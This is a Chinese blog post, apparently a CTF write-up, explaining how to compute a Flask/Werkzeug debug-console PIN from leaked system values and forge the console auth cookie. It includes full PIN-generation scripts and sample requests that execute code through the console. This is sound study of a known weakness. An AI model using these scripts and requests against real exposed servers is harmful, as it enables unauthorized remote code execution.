@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            flask pin码和console cookie计算
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <p>关于pin的东西，之前遇到过但没深入分析，sctf的题要算PIN，我甚至还算不熟练，这次彻底搞懂。</p>
+<h1 id="生成pin码"><a href="#生成pin码" class="headerlink" title="生成pin码"></a>生成pin码</h1><p>先贴脚本：</p>
+<p>python 3.8：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># python 3.8 PIN码 sha1加密</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;  # /etc/passwd</span><br><span class="line">    &#x27;flask.app&#x27;,  # 默认值</span><br><span class="line">    &#x27;Flask&#x27;,  # 默认值</span><br><span class="line">    &#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;  # 报错得到</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">	#十进制</span><br><span class="line">    &#x27;2485377892354&#x27;,  </span><br><span class="line">    #machine_id</span><br><span class="line">    &#x27;96cec10d3d9307792745ec3b85c89620&#x27;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv = None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>非3.8：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># python 3.6 PIN码 md5加密</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;  # username</span><br><span class="line">    &#x27;flask.app&#x27;,  # modname</span><br><span class="line">    &#x27;Flask&#x27;,  # getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br><span class="line">    &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;  # getattr(mod, &#x27;__file__&#x27;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">	# str(uuid.getnode()),  /sys/class/net/ens33/address 或 /sys/class/net/eth0/address</span><br><span class="line">    &#x27;2485376933845&#x27;,  </span><br><span class="line">    # get_machine_id(), /etc/machine-id</span><br><span class="line">    &#x27;e0ad2d31-1d21-4f57-b1c5-4a9036fbf2351204f386ccfe3d9f80858b45581b01600775b944e5df748745f5d38e184db378&#x27; </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv = None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="get-machine-id"><a href="#get-machine-id" class="headerlink" title="get_machine_id"></a>get_machine_id</h1><p>这里一直搞不明白，网上的也看得迷迷糊糊，还分docker，给绕晕了，就自己看源码，测试后发现跟docker没关系。</p>
+<p>werkzeug源码：<a target="_blank" rel="noopener" href="https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py#L391">https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py#L391</a></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619103054198.png" alt="image-20230619103054198.png"><br>rpartition方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = &#x27;aaaaaaaaa/bbbbbbbb/ccccccccccc&#x27;</span><br><span class="line">print(s.rpartition(&#x27;/&#x27;)) #(&#x27;aaaaaaaaa/bbbbbbbb&#x27;, &#x27;/&#x27;, &#x27;ccccccccccc&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>总结：get_machine_id先读取&#x2F;etc&#x2F;machine-id，有值则不读取&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id，否则读。</p>
+<p>接着读&#x2F;proc&#x2F;self&#x2F;cgroup，取第一行的最后一个斜杠<code>/</code>后面的所有字符串，和上面读到的值拼接起来。</p>
+<p>最后得到的就是machine_id。</p>
+<p>非docker环境：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619125945112.png" alt="image-20230619125945112.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619130014725.png" alt="image-20230619130014725.png"><br>直接拼起来：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619130115312.png" alt="image-20230619130115312.png"><br>算的对。</p>
+<p>docker环境：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619130155968.png" alt="image-20230619130155968.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619130215546.png" alt="image-20230619130215546.png"><br>cgroup是空的，照样拼上去，machine_id就是96cec10d3d9307792745ec3b85c89620。</p>
+<h1 id="手算cookie"><a href="#手算cookie" class="headerlink" title="手算cookie"></a>手算cookie</h1><p>有些情况下，无法获取返回的cookie，或者无法直接通过浏览器进入debug的控制台，该如何利用？</p>
+<p>先看看发pin码然后执行命令的大概流程：</p>
+<p>发送验证pin码的请求</p>
+<p><code>GET /?__debugger__=yes&amp;cmd=pinauth&amp;pin=130-616-273&amp;s=prj74Iraob1k5eMHiH37</code></p>
+<p>响应：<code>&#123;&quot;auth&quot;: true, &quot;exhausted&quot;: false&#125;</code></p>
+<p>若auth成功，还会带一个cookie：</p>
+<p><code>Set-Cookie: __wzdaba192b254d6aa653a27=1687143761|fd1c004c3dc3; HttpOnly; Path=/; SameSite=Strict</code></p>
+<p>之后执行命令的请求，要带上面发过来的cookie，否则不执行命令：</p>
+<p><code>GET /?&amp;__debugger__=yes&amp;cmd=print(1)&amp;frm=140324285712640&amp;s=prj74Iraob1k5eMHiH37</code></p>
+<p>响应：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; print(1)</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>所以执行命令的关键就是拿frm，s，cookie。</p>
+<p>gpt对frm即frame的解释：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619113346350.png" alt="image-20230619113346350.png"><br>s的拿法，直接访问console路由，没有安全限制的：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619111220205.png" alt="image-20230619111220205.png"></p>
+<p>frm的拿法：</p>
+<p>直接访问报错页面，任意一个即可：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619111402061.png" alt="image-20230619111402061.png"></p>
+<p>但有时题目不存在报错机会，直接0就行。怎么发现的？</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619111627289.png" alt="image-20230619111627289.png"><br>cookie拿法：</p>
+<p>先看源码</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619111758952.png" alt="image-20230619111758952.png"><br>cookie的名字直接在生成PIN码的脚本里就有。</p>
+<p>然后看cookie值，在pin_auth函数里，验证pin成功时返回cookie：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619111931824.png" alt="image-20230619111931824.png"><br>hash_pin好拿，就是不知道time.time()有什么用，就看哪里检验cookie有效</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619112431530.png" alt="image-20230619112431530.png"><br>所以竖线前面的填一个值，这个值加上PIN_TIME比time.time()大就行。PIN_TIME是<code>60*60*24*7</code>。</p>
+<p>加上hash_pin的算法，生成cookie值：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619112946217.png" alt="image-20230619112946217.png"></p>
+<p>发包试试：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/flask-pin/image-20230619113058457.png" alt="image-20230619113058457.png"></p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%9F%E6%88%90pin%E7%A0%81"><span class="toc-text">生成pin码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#get-machine-id"><span class="toc-text">get_machine_id</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%8B%E7%AE%97cookie"><span class="toc-text">手算cookie</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
